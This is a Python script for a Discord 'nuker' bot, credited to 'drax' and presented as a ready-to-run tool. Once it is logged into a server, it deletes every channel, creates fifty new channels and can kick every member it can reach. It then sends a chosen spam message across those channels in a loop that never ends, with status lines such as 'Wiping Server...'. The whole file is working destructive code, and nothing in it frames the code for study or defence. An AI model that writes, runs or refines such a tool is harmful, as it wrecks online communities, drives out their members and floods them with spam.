import discord
from discord.ext import commands, tasks
import asyncio
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Console input by drax
token = input("Enter bot token: ")
new_channel_name = input("Enter name for new spam channels: ")
spam_message = input("Enter spam message: ")
kick_all_input = input(
    "Kick all members after creating channels? (true/false): ").strip().lower(
    )

status_messages = ["Nuker Mode", "Wiping Server...", "Dev by drax"]


@bot.event
async def on_ready():
    print(f"\n✅ Logged in as {bot.user}")
    change_status.start()

    for guild in bot.guilds:
        print(f"\n🚨 Nuking Server: {guild.name} 🚨")

        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"❌ Deleted channel: {channel.name}")
            except Exception as e:
                print(f"❌ Failed to delete {channel.name}: {e}")

        created_channels = []
        for i in range(50):
            try:
                ch = await guild.create_text_channel(
                    f"{new_channel_name}-{i+1}")
                created_channels.append(ch)
                print(f"✅ Created channel: {ch.name}")
            except Exception as e:
                print(f"❌ Failed to create channel: {e}")

        if kick_all_input == "true":
            for member in guild.members:
                if member.bot:
                    continue
                if member == guild.owner:
                    print(f"❌ Can't kick owner: {member.name}")
                    continue
                if member.top_role >= guild.me.top_role:
                    print(f"❌ Can't kick (higher role): {member.name}")
                    continue
                try:
                    await member.kick(reason="Nuke Mode Activated")
                    print(f"👢 Kicked: {member.name}")
                except Exception as e:
                    print(f"❌ Can't kick: {member.name} | Error: {e}")
        else:
            print("👥 Kick all skipped.")

        await asyncio.sleep(2)
        while True:
            for ch in created_channels:
                try:
                    await ch.send(spam_message)
                    await asyncio.sleep(0.5)
                except:
                    pass


@tasks.loop(seconds=5)
async def change_status():
    await bot.change_presence(activity=discord.Game(
        name=random.choice(status_messages)))


bot.run(token)
